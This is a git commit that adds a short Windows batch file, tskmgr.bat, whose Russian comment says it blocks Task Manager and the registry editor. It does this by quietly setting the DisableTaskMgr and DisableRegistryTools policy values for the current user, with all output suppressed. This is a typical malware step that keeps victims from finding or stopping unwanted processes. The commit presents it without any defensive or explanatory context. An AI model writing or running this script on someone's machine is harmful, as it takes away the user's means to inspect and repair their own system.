7868da5733a5639f7f04145a12f177144a48cd42
SchoolSigmaBoy <xc1rze2@gmail.com>
2025-01-18 13:08:47 +0400

    Add files via upload

---
+++ tskmgr.bat
@@ -0,0 +1,5 @@
+:: Запрет доступа к диспетчеру задач и regedit
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul 2>&1
+
+exit /b
